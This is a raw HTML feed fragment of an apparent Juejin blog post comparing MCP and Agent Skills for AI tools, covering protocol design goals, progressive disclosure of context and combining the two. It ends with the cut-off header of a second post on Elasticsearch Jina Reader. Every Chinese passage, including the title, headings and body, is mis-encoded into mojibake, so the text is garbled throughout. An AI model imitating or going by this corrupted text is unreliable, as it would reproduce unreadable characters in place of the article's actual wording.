content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AlienZHOU"/> <meta itemprop="url" content="https://juejin.cn/user/3843548380668829"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MCP æ˜¯æœ€å¤§éª—å±€ï¼ŸSkills æ‰æ˜¯æ•‘æ˜Ÿï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3843548380668829/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AlienZHOU
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T04:44:40.000Z" title="Tue Jan 13 2026 04:44:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å°¤è®°å¾—ä¸ŠåŠå¹´å¤§å®¶å¯¹ MCP çš„ç‹‚çƒ­ï¼Œé‡äººå°±ä¼šå’Œæˆ‘èŠåˆ° MCPã€‚ç„¶è€Œä»è½åœ°ä½¿ç”¨ä¸Šä¼¼ä¹ä¸æ˜¯è¿™ä¹ˆä¸ªæƒ…å†µã€‚ç¤¾åŒºé‡Œé¢æµä¼ ç€ä¸€å¥è¯ï¼šMCP æ˜¯ä¸€ä¸ªå¼€å‘è€…è¿œè¶…ä½¿ç”¨è€…çš„åŠŸèƒ½ã€‚é‚£ä¹ˆ MCP çœŸçš„æ˜¯ä¸–ä¸Šæœ€å¤§éª—å±€å—ï¼Ÿ</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0c52c78087734b01be83db7ae6968361~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQWxpZW5aSE9V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768884280&amp;x-signature=ae29qPaCLkJ8OfE90AOP0jBnDTE%3D" alt="" loading="lazy"/></p>
<p>å¦‚æœä½ æ˜¯ AI å·¥å…·çš„ç”¨æˆ·ï¼ˆè€Œä¸æ˜¯å¼€å‘è€…ï¼‰ï¼Œè¿™ç¯‡æ–‡ç« å¯èƒ½ä¼šä»å¦ä¸€è§’åº¦æ¥å°è¯•è§£é‡Šï¼šä¸ºä»€ä¹ˆ MCP è¿™ä¹ˆç«ï¼Œä½†ä½ ç”¨èµ·æ¥æ€»è§‰å¾—â€æ²¡ä»€ä¹ˆç”¨â€ï¼ŸSkills ä¸ºä»€ä¹ˆå¯èƒ½æ‰æ˜¯ä½ çœŸæ­£éœ€è¦çš„ä¸œè¥¿ã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€MCPï¼šå¼€å‘è€…çš„ç‹‚æ¬¢ï¼Œç”¨æˆ·çš„æ‡µåœˆ</h2>
<p>MCPï¼ˆModel Context Protocolï¼‰åœ¨ 2024 å¹´åº•ç”± Anthropic å‘å¸ƒï¼Œå·ç§°æ˜¯ AI é¢†åŸŸçš„â€USB-Câ€â€”â€”ä¸€ä¸ªæ ‡å‡†åŒ–çš„åè®®ï¼Œè®© AI å¯ä»¥è¿æ¥å„ç§å¤–éƒ¨å·¥å…·ã€‚</p>
<p>å¬èµ·æ¥å¾ˆç¾å¥½ã€‚ä½†ç°å®æ˜¯ç¤¾åŒºé‡Œå……æ–¥ç€å¯¹ MCP çš„å˜²è®½ï¼Œç§°å…¶ä¸ºâ€æœ€å¤§éª—å±€â€ã€‚</p>
<blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fdotey%2Fstatus%2F1971626371349991813" target="_blank" title="https://x.com/dotey/status/1971626371349991813" ref="nofollow noopener noreferrer">MCP å¯èƒ½æ˜¯å”¯ä¸€å¼€å‘è€…æ¯”ä½¿ç”¨è€…è¿˜å¤šçš„æŠ€æœ¯</a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1982787663686819915" target="_blank" title="https://zhuanlan.zhihu.com/p/1982787663686819915" ref="nofollow noopener noreferrer">å¼€å‘è€…ä¸ºä»€ä¹ˆåæ§½ MCP åè®®ï¼Ÿ</a></p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a00cf375f0d64a9f9e00f8fc31451b1c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQWxpZW5aSE9V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768884280&amp;x-signature=qA5x2tF%2BcP%2FGcN7yLfaYnJkfa8c%3D" alt="" loading="lazy"/></p>
<p>è¿™æ„å‘³ç€ä»€ä¹ˆï¼Ÿ</p>
<p><strong>å¤§é‡å¼€å‘è€…åœ¨ã€Œç ”ç©¶ã€MCPï¼Œä½†çœŸæ­£èƒ½ç»™ç”¨æˆ·ç”¨çš„å·¥å…·å°‘å¾—å¯æ€œã€‚</strong></p>
<p>SDK æœˆä¸‹è½½é‡ 9700 ä¸‡æ¬¡ï¼ŒRegistry å¢é•¿ 407%â€”â€”å¼€å‘è€…çƒ­æƒ…é«˜æ¶¨ã€‚ä½†ä½œä¸ºç”¨æˆ·ï¼Œä½ æ‰“å¼€ Claude æˆ– Cursorï¼Œæƒ³æ‰¾ä¸ªå¥½ç”¨çš„ MCP å·¥å…·ï¼Œå¤§æ¦‚ç‡è¿˜æ˜¯ä¼šå¤±æœ›ã€‚</p>
<p>è¿™ä¸æ˜¯ MCP çš„é”™ã€‚è¿™æ˜¯å®ƒçš„ã€ŒåŸºå› ã€å†³å®šçš„ã€‚</p>
<hr/>
<h2 data-id="heading-1">äºŒã€åè®®çš„ã€ŒåŸºå› ã€å†³å®šäº†è°å—ç›Š</h2>
<p>ä¸ºä»€ä¹ˆ MCP å¯¹ç”¨æˆ·ä¸å‹å¥½ï¼Ÿä¹Ÿè®¸ç­”æ¡ˆè—åœ¨åè®®è®¾è®¡æœ¬èº«ã€‚</p>
<p>æˆ‘ä»¬å¯¹æ¯”ä¸‹ MCP å’Œ Skillsï¼ˆAgent Skillsï¼‰ä¸¤ä¸ªåè®®çš„è§„èŒƒï¼š</p>

























<table><thead><tr><th>ç»´åº¦</th><th>MCP</th><th>Skills</th></tr></thead><tbody><tr><td>åè®®è§„å®šçš„æ˜¯</td><td>å¼€å‘è€…æ€ä¹ˆå†™å·¥å…·</td><td>AI æ€ä¹ˆç”¨èƒ½åŠ›</td></tr><tr><td>è§„èŒƒå†…å®¹</td><td>APIã€Schemaã€SDK</td><td>Markdownã€Instructions</td></tr><tr><td>å¼€å‘è€…ä¸Šæ‰‹é—¨æ§›</td><td>æ‡‚ JSON Schema + SDK</td><td>ä¼šå†™ Markdown</td></tr></tbody></table>
<blockquote>
<p>æ¥æºï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmodelcontextprotocol.io%2F" target="_blank" title="https://modelcontextprotocol.io/" ref="nofollow noopener noreferrer">modelcontextprotocol.io</a> / <a href="https://link.juejin.cn?target=https%3A%2F%2Fagentskills.io%2F" target="_blank" title="https://agentskills.io/" ref="nofollow noopener noreferrer">agentskills.io</a></p>
</blockquote>
<p><strong>MCP åè®®è§„å®šçš„æ˜¯ã€Œå¼€å‘è€…æ€ä¹ˆå†™å·¥å…·ã€</strong>â€”â€”API æ¥å£æ€ä¹ˆå®šä¹‰ã€æ•°æ®ç»“æ„æ€ä¹ˆä¼ é€’ã€SDK æ€ä¹ˆé›†æˆã€‚è¿™äº›å¯¹å¼€å‘è€…å¾ˆé‡è¦ï¼Œä½†æ™®é€šç”¨æˆ·æ ¹æœ¬ä¸å…³å¿ƒã€‚</p>
<p><strong>Skills åè®®è§„å®šçš„æ˜¯ã€ŒAI æ€ä¹ˆç”¨èƒ½åŠ›ã€</strong>â€”â€”ä»€ä¹ˆæ—¶å€™åŠ è½½ã€æ€ä¹ˆç†è§£æŒ‡ä»¤ã€å¦‚ä½•æ‰§è¡Œä»»åŠ¡ã€‚è¿™äº›ç›´æ¥å½±å“ç”¨æˆ·ä½“éªŒã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba0e137120134594bacd1f61279b1de0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQWxpZW5aSE9V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768884280&amp;x-signature=eORdVpm6BAOwrcaITCjL8WUDG9U%3D" alt="" loading="lazy"/></p>
<p>å³ä½¿å¼€å‘è€…æ¥è¯´ï¼ŒSkill çš„ä¸Šæ‰‹æˆæœ¬ä¹Ÿéƒ½è¿œä½äº MCPã€‚ç”šè‡³ç®€å•çš„ Skillsï¼Œä½¿ç”¨è€…å¯ä»¥åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­æ— ç¼åˆ‡æ¢ä¸ºå¼€å‘è€…ï¼Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F-3k6--An5nTWg8P8kgqEKg" target="_blank" title="https://mp.weixin.qq.com/s/-3k6--An5nTWg8P8kgqEKg" ref="nofollow noopener noreferrer">è¾¹ç”¨è¾¹ä¼˜åŒ–</a>ã€‚</p>
<p><strong>ä¸€å¥è¯æ€»ç»“</strong>ï¼šMCP é¢å‘å¼€å‘è€…ï¼Œå°½åŠ›ä¼˜åŒ–äº†å¼€å‘ä½“éªŒï¼Œåœ¨ Agent å¦‚ä½•ä½¿ç”¨è¿™äº›å·¥å…·ä¸Šå´æ²¡æœ‰ç»™å‡ºå¤ªå¤šæŒ‡å¯¼ï¼›Skill é¢å‘ä½¿ç”¨è€…ï¼Œä¼˜åŒ–ä½¿ç”¨ä½“éªŒï¼ˆåŒ…æ‹¬æˆæœ¬ï¼‰ï¼Œåœ¨ Agent å¦‚ä½•ä½¿ç”¨è¿™äº›å·¥å…·ä¸Šç»™å‡ºäº†å¾ˆå¤šæŒ‡å¯¼ã€‚</p>
<p>åè®®çš„è®¾è®¡ç›®æ ‡ï¼Œå†³å®šäº†è°èƒ½ä»ä¸­è·ç›Šã€‚</p>
<hr/>
<h2 data-id="heading-2">ä¸‰ã€Skills çš„æ€æ‰‹é”ï¼šæ¸è¿›å¼æŠ«éœ²</h2>
<p>é™¤äº†è®¾è®¡ç›®æ ‡ä¸åŒï¼ŒSkills è¿˜æœ‰ä¸€ä¸ªæŠ€æœ¯ä¸Šçš„ä¼˜åŠ¿ï¼š<strong>æ¸è¿›å¼æŠ«éœ²ï¼ˆProgressive Disclosureï¼‰</strong> ã€‚</p>
<p>è¿™æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿç”¨ä¸€ä¸ªç±»æ¯”æ¥è§£é‡Šï¼šå›¾ä¹¦é¦†æ‰¾ä¹¦ã€‚</p>
<p>æƒ³è±¡ä½ å»å›¾ä¹¦é¦†æ‰¾èµ„æ–™ï¼š</p>
<p><strong>MCP æ–¹å¼</strong>ï¼šç®¡ç†å‘˜æŠŠæ•´ä¸ªä¹¦æ¶çš„ä¹¦å…¨æ¬åˆ°ä½ é¢å‰ã€‚ç»“æœï¼š<strong>ä¿¡æ¯è¿‡è½½ï¼Œæ‰¾ä¸åˆ°é‡ç‚¹</strong> ğŸ“šğŸ“šğŸ“š</p>
<p><strong>Skill æ–¹å¼</strong>ï¼šç®¡ç†å‘˜å…ˆç»™ä½ ä¸€æœ¬ç›®å½•ï¼Œä½ è¯´è¦å“ªæœ¬å†æ‹¿å“ªæœ¬ã€‚ç»“æœï¼š<strong>ç²¾å‡†é«˜æ•ˆ</strong> ğŸ“‹â†’ğŸ“–</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0b90d4341e1542a69045ca13313450ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQWxpZW5aSE9V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768884280&amp;x-signature=QftAV5A5E8Pw2a0e9RSxLG%2BdOFU%3D" alt="" loading="lazy"/></p>
<p>AI çš„ã€Œè„‘å®¹é‡ã€æœ‰é™ï¼ˆContext Windowï¼‰ã€‚</p>
<ul>
<li><strong>ä¼ ç»Ÿæ–¹å¼</strong>ï¼šä¸€æ¬¡æ€§åŠ è½½æ‰€æœ‰å·¥å…·å®šä¹‰ã€‚å‡è®¾æœ‰ 100 ä¸ªå·¥å…·ï¼Œå¯èƒ½å ç”¨å‡ åä¸‡ tokensã€‚</li>
<li><strong>Skill æ–¹å¼</strong>ï¼šå¯åŠ¨æ—¶åªåŠ è½½åç§°å’Œæè¿°ï¼ˆçº¦ 100 tokens/skillï¼‰ã€‚éœ€è¦å“ªä¸ªï¼Œå†åŠ è½½å“ªä¸ªçš„è¯¦ç»†æŒ‡ä»¤ã€‚</li>
</ul>
<p>æ ¹æ® <a href="https://link.juejin.cn?target=https%3A%2F%2Fagentskills.io%2Fwhat-are-skills" target="_blank" title="https://agentskills.io/what-are-skills" ref="nofollow noopener noreferrer">agentskills.io å®˜æ–¹è§„èŒƒ</a>ï¼š</p>
<ul>
<li>å…ƒæ•°æ®å±‚ï¼š~100 tokens/skill</li>
<li>å®Œæ•´æŒ‡ä»¤ï¼šå»ºè®® &lt;5000 tokens</li>
</ul>
<p>è¿™æ„å‘³ç€ä»€ä¹ˆï¼Ÿ100 ä¸ª Skillsï¼Œå¯åŠ¨æ—¶åªéœ€è¦çº¦ 10,000 tokens çš„å…ƒæ•°æ®ã€‚è€Œä¸æ˜¯ä¸€è‚¡è„‘å¡è¿›å»å‡ åä¸‡ tokensã€‚</p>
<ol>
<li>AI ä¸ä¼šè¢«æ— å…³ä¿¡æ¯å¹²æ‰°ï¼Œæ›´èªæ˜</li>
<li>å“åº”æ›´å¿«</li>
<li>èƒ½æ”¯æŒæ›´å¤šå·¥å…·</li>
</ol>
<hr/>
<h2 data-id="heading-3">å››ã€ä¸¤è€…ä¸æ˜¯å¯¹æ‰‹ï¼Œæ˜¯æ­æ¡£</h2>
<p>è¯´äº†è¿™ä¹ˆå¤š Skills çš„å¥½è¯ï¼Œæ˜¯ä¸æ˜¯æ„å‘³ç€ MCP æ²¡ç”¨äº†ï¼Ÿä¸æ˜¯ã€‚</p>
<p><strong>MCP å’Œ Skills è§£å†³çš„æ˜¯ä¸åŒå±‚æ¬¡çš„é—®é¢˜</strong>ï¼š</p>
<ul>
<li><strong>MCP = å·¥å…·ç®±</strong>ï¼šå®šä¹‰äº†ã€Œèƒ½è¿æ¥ä»€ä¹ˆã€â€”â€”æ•°æ®åº“ã€APIã€æ–‡ä»¶ç³»ç»Ÿã€ç¬¬ä¸‰æ–¹æœåŠ¡</li>
<li><strong>Skills = ä½¿ç”¨æ‰‹å†Œ</strong>ï¼šå®šä¹‰äº†ã€Œæ€ä¹ˆèªæ˜åœ°ç”¨è¿™äº›å·¥å…·ã€â€”â€”å·¥ä½œæµç¨‹ã€æœ€ä½³å®è·µã€æŒ‰éœ€åŠ è½½</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c11211e1fb0147bb858013690693790b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQWxpZW5aSE9V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768884280&amp;x-signature=fksZ47aaFRKrCCbT%2BaCYPKHFnEg%3D" alt="" loading="lazy"/></p>
<p>å®ƒä»¬ä¹Ÿå¯ä»¥ç»“åˆä½¿ç”¨ï¼š</p>
<blockquote>
<p>ç”¨ Skills çš„æ¸è¿›å¼æŠ«éœ²æ¥ç®¡ç† MCP å·¥å…·ã€‚</p>
</blockquote>
<p>MCP è´Ÿè´£ã€Œè¿æ¥ã€ï¼ŒSkills è´Ÿè´£ã€Œæ™ºæ…§ã€ã€‚ç»„åˆæ˜¯ä¸€ä¸ªå¥½çš„è§£å†³æ–¹æ¡ˆã€‚</p>
<hr/>
<h2 data-id="heading-4">äº”ã€ç»™ç”¨æˆ·çš„å»ºè®®</h2>
<ol>
<li><strong>åˆ«å…‰è¢« MCP çš„çƒ­åº¦å¸¦èŠ‚å¥</strong>ã€‚22000+ ä¸ªä»“åº“å¬èµ·æ¥å¾ˆå¤šï¼Œä½†è½åœ°çš„æœ‰å¤šå°‘å‘¢ï¼Ÿ</li>
<li><strong>å…³æ³¨ Skills ç”Ÿæ€</strong>ã€‚å¦‚æœä½ ç”¨ Claude Code ç­‰å·¥å…·ï¼ˆè¿‘æœŸ Kwaipilot ä¹Ÿä¼šæ”¯æŒï¼‰ï¼ŒSkills å¯èƒ½æ¯” MCP æ›´èƒ½ç›´æ¥æå‡ä½ çš„ä½“éªŒã€‚</li>
<li><strong>ä¸¤è€…éƒ½å…³æ³¨</strong>ã€‚é•¿æœŸæ¥çœ‹ï¼ŒMCP + Skills çš„ç»„åˆå¯èƒ½æ˜¯ä¸€ç§é€‰æ‹©ã€‚MCP æä¾›è¿æ¥èƒ½åŠ›ï¼ŒSkills æä¾›ä½¿ç”¨æ™ºæ…§ã€‚</li>
<li><strong>2026 å¹´</strong>ï¼šæ¸è¿›å¼æŠ«éœ²å’ŒåŠ¨æ€ä¸Šä¸‹æ–‡ç®¡ç†ä¼šæˆä¸º AI å·¥å…·çš„æ ‡é…ã€‚è¿‘æœŸæˆ‘çš„ä¸€ä¸ªå®è·µ â€”â€” åŸºäº 20w å­—çš„ Specs æ¥è®© Agent å®ç°ä¸€ä¸ª 10pd éœ€æ±‚ â€”â€” ä¹Ÿæ˜¯é€šè¿‡æ¸è¿›å¼æŠ«éœ² Specsã€‚<a href="https://link.juejin.cn?target=https%3A%2F%2Fcursor.com%2Fcn%2Fblog%2Fdynamic-context-discovery" target="_blank" title="https://cursor.com/cn/blog/dynamic-context-discovery" ref="nofollow noopener noreferrer">Cursor ä¹Ÿå·²ç»ç»™å‡ºäº†å¾ˆå¥½çš„è§£é‡Š</a>ã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-5">ç»“è¯­</h2>
<p>MCP æ˜¯æœ€å¤§éª—å±€å—ï¼Ÿä¸æ˜¯ã€‚å®ƒä¹Ÿæ˜¯ä¸€ä¸ªä¼˜ç§€çš„å¼€å‘è€…åè®®ã€‚</p>
<p>Skills æ˜¯æ•‘æ˜Ÿå—ï¼Ÿå¯¹ç”¨æˆ·æ¥è¯´ï¼Œç›®å‰æ¥è¯´å¯èƒ½æ˜¯çš„ã€‚</p>
<p><strong>åè®®çš„è®¾è®¡ç›®æ ‡ï¼Œå†³å®šäº†è°èƒ½ä»ä¸­è·ç›Šã€‚</strong> MCP è®©å¼€å‘è€…æ›´å®¹æ˜“å†™å·¥å…·ï¼ŒSkills è®©ç”¨æˆ·æ›´å®¹æ˜“ç”¨å·¥å…·ã€‚</p>
<p>å¦‚æœä½ æ˜¯ç”¨æˆ·ï¼Œåˆ«çº ç»“ MCP ä¸ºä»€ä¹ˆâ€ä¸å¥½ç”¨â€äº†ã€‚å»çœ‹çœ‹ Skills å§ã€‚</p>
<hr/>
<h2 data-id="heading-6">å‚è€ƒé“¾æ¥</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmodelcontextprotocol.io%2F" target="_blank" title="https://modelcontextprotocol.io/" ref="nofollow noopener noreferrer">MCP å®˜æ–¹æ–‡æ¡£</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fagentskills.io%2F" target="_blank" title="https://agentskills.io/" ref="nofollow noopener noreferrer">Agent Skills å®˜æ–¹è§„èŒƒ</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.anthropic.com%2Fnews%2Fskills" target="_blank" title="https://www.anthropic.com/news/skills" ref="nofollow noopener noreferrer">Anthropic Skills å‘å¸ƒå…¬å‘Š</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1982787663686819915" target="_blank" title="https://zhuanlan.zhihu.com/p/1982787663686819915" ref="nofollow noopener noreferrer">å¼€å‘è€…ä¸ºä»€ä¹ˆåæ§½ MCP åè®®ï¼Ÿ</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Elasticsearchï¼šJina Reader]]></title>    <link>https://juejin.cn/post/7594389431835803689</link>    <guid>https://juejin.cn/post/7594389431835803689</guid>    <pubDate>2026-01-13T04:45:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594389431835803689" data-draft-id="7594302398687658038" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Elasticsearchï¼šJina Reader"/> <meta itemprop="keywords" content="Elasticsearch"/> <meta itemprop="datePublished" content="2026-01-13T04:45:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Elasticsearch"/> <meta itemprop="url" content="https://juejin.cn/user/2612095360441448"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Elasticsearchï¼šJina Reader
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2612095360441448/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Elasticsearch
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T04:45:55.000Z" title="Tue Jan 13 2026 04:45:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
